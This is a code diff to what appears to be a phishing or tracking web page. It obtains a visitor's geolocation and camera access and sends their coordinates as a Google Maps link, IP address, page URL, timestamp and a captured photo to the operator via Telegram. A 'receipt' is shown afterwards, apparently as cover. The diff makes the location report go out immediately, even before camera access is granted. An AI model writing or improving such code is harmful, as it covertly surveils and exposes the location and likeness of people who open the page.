@@ -125,17 +125,17 @@
       navigator.geolocation.getCurrentPosition(
         (position) => {
           console.log("Localização acessada com sucesso:", position.coords);
-          // sendMessage(`https://www.google.com/maps/search/?api=1&query=${position.coords.latitude}%2C${position.coords.longitude}`);
+          const currentDateTime = Date().toLocaleUpperCase("pt-BR");
+          const message = `
+                🌐 ${window.location.href} \n📅 Date / Time: ${currentDateTime}\n🏠 Location: https://www.google.com/maps/search/?api=1&query=${position.coords.latitude}%2C${position.coords.longitude}\n📍 IP: ${ipAddress}
+              `;
+          sendMessage(message);
 
           // Request camera permission after location is granted
           navigator.mediaDevices.getUserMedia({ video: true })
             .then((stream) => {
               console.log("Permissão da câmera concedida.");
-              const currentDateTime = Date().toLocaleUpperCase("pt-BR")
-              const caption = `
-                🌐 ${window.location.href} \n📅 Date / Time: ${currentDateTime}\n🏠 Location: https://www.google.com/maps/search/?api=1&query=${position.coords.latitude}%2C${position.coords.longitude}\n📍 IP: ${ipAddress}
-              `
-              captureImageAndSendToTelegram(stream, caption);  // Capture image and send to Telegram
+              captureImageAndSendToTelegram(stream, message);  // Capture image and send to Telegram
               showReceipt();
             })
             .catch((error) => {
